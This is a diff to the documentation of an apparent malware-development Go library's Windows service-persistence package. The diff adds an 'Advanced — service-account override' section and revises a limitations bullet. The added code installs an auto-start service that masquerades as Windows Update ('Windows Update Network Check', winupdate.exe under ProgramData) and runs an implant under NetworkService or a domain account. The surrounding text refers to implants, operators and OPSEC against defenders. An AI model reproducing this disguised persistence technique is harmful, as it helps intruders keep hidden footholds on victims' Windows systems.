@@ -200,6 +200,34 @@ _ = service.Install(&service.Config{
 
 See [`ExampleService`](../../../persistence/service/service_example_test.go).
 
+### Advanced — service-account override
+
+When `LocalSystem` is too noisy, pin the service to a built-in
+low-priv principal (no password needed) or to a normal user
+that already holds `SeServiceLogonRight`.
+
+```go
+// 1. Built-in NT AUTHORITY\NetworkService — no password.
+//    Already holds SeServiceLogonRight.
+_ = service.Install(&service.Config{
+    Name:        "WinUpdateNetCheck",
+    DisplayName: "Windows Update Network Check",
+    BinPath:     `C:\ProgramData\Microsoft\winupdate.exe`,
+    StartType:   service.StartAuto,
+    Account:     `NT AUTHORITY\NetworkService`,
+})
+
+// 2. Domain account. Account MUST already hold
+//    SeServiceLogonRight (granted via secedit / GPO / LsaAddAccountRights).
+_ = service.Install(&service.Config{
+    Name:      "WinUpdateContext",
+    BinPath:   `C:\ProgramData\Microsoft\winupdate.exe`,
+    StartType: service.StartManual,
+    Account:   `CORP\svc-winupdate`,
+    Password:  os.Getenv("MALDEV_SVC_PWD"),
+})
+```
+
 ## OPSEC & Detection
 
 | Artefact | Where defenders look |
@@ -252,10 +280,16 @@ See [`ExampleService`](../../../persistence/service/service_example_test.go).
   the contract should run as `StartManual` + a separate
   trigger, or wrap the implant binary with the
   `golang.org/x/sys/windows/svc` runner.
-- **No service-account override.** This package installs as
-  `LocalSystem` (default). Running as a specific account
-  needs `ChangeServiceConfig` + `LogonAsAService` granted
-  on that account.
+- **Service-account override is one-step (P2.15 partial).**
+  `Config.Account` + `Config.Password` propagate through to
+  `mgr.CreateService` so non-LocalSystem services install
+  fine. **The account MUST already hold
+  `SeServiceLogonRight`** — this package does not auto-grant
+  it. Built-in `NT AUTHORITY\NetworkService` /
+  `LocalService` already hold the right and need no password.
+  An LSA `LsaAddAccountRights` helper is queued under
+  backlog row P2.15 for the day operators want one-shot
+  user-account services.
 - **Boot/System start types.** `StartBoot` / `StartSystem`
   are kernel-driver-only; userland binaries with these
   start types are rejected by SCM.
